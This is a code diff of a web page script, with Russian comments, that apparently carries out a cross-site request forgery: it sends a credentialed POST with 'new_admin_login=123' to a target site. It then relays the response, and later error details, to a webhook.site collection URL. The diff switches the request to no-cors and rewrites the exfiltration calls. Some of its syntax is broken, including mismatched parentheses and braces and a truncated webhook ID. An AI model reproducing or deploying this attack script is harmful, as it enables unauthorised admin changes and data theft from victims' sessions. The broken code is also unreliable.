@@ -11,7 +11,7 @@
   "body": "new_admin_login=123",
   "method": "POST",
   credentials: 'include',
-  "mode": "cors",
+  mode: "no-cors", // Изменили на no-cors
 })
   .then(res => {
     // ЭТО РАБОТАЕТ ТОЛЬКО ЕСЛИ ЕСТЬ CORS!s
@@ -23,7 +23,7 @@
   })
   .then(data => {
 
-    fetch("https://webhook.site/921ed5f4-97f3-4a0e-a0ae-05295d30d97e?data="+ encodeURIComponent(JSON.stringify(data)), {
+    fetch("https://webhook.site/921ed5f4-97f3-4a0e-a0ae-05295d30d97e?data="+ encodeURIComponent(JSON.stringify(data))), {
   "headers": {
     "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
     "accept-language": "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7",
@@ -40,27 +40,15 @@
   "method": "GET",
   "mode": "cors",
   "credentials": "include"
-});
-  })
-  .catch(data => {
-    fetch("https://webhook.site/921ed5f4-97f3-4a0e-a0ae-05295d30d97e?data="+ encodeURIComponent(JSON.stringify(data)), {
-  "headers": {
-    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-    "accept-language": "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7",
-    "sec-ch-ua": "\"Not(A:Brand\";v=\"8\", \"Chromium\";v=\"144\", \"Microsoft Edge\";v=\"144\"",
-    "sec-ch-ua-mobile": "?0",
-    "sec-ch-ua-platform": "\"Windows\"",
-    "sec-fetch-dest": "document",
-    "sec-fetch-mode": "navigate",
-    "sec-fetch-site": "none",
-    "sec-fetch-user": "?1",
-    "upgrade-insecure-requests": "1"
-  },
-  "body": null,
-  "method": "GET",
-  "mode": "cors",
-  "credentials": "include"
-});
+}})
+ .catch(error => {
+  // Отправляем только информацию об ошибке
+  const errorInfo = {
+    message: error.message,
+    type: error.name
+  };
+  
+  fetch("https://webhook.site/921ed5f3-4a0e-a0ae-05295d30d97e?error=" + encodeURIComponent(JSON.stringify(errorInfo)));
   })
 </script>
 </body>
